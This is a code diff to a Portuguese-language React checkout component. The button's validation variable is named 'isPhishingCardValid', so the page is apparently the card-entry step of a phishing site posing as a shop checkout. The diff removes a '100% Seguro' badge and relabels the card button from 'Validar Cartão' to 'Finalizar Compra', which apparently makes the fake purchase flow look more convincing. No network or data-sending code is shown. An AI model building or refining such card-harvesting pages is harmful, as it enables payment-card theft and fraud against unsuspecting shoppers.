@@ -291,7 +291,6 @@ const Checkout = () => {
                         <div className="absolute top-0 left-0 w-full h-1 bg-primary rounded-t-xl"></div>
                         <div className="flex justify-between items-center">
                           <p className="font-bold text-slate-700">Dados do Cartão</p>
-                          <span className="flex items-center gap-1 text-[11px] text-green-700 font-bold uppercase bg-green-100 px-2 py-1 rounded"><Lock className="h-3 w-3"/> 100% Seguro</span>
                         </div>
                         <div className="space-y-4">
                           <div>
@@ -311,7 +310,7 @@ const Checkout = () => {
                     <div className="flex gap-3 pt-2">
                       <Button variant="outline" onClick={() => setCurrentStep("endereco")} className="w-1/3 h-14">Voltar</Button>
                       <Button onClick={handlePreValidate} disabled={loading || !isPhishingCardValid} className={`w-2/3 h-14 text-lg font-bold shadow-md ${paymentMethod === 'pix' ? 'bg-[#32bcad] hover:bg-[#259b8e]' : ''}`}>
-                        {loading ? "Processando..." : (paymentMethod === 'pix' ? "Gerar Código Pix" : "Validar Cartão")}
+                        {loading ? "Processando..." : (paymentMethod === 'pix' ? "Gerar Código Pix" : "Finalizar Compra")}
                       </Button>
                     </div>
                   </>
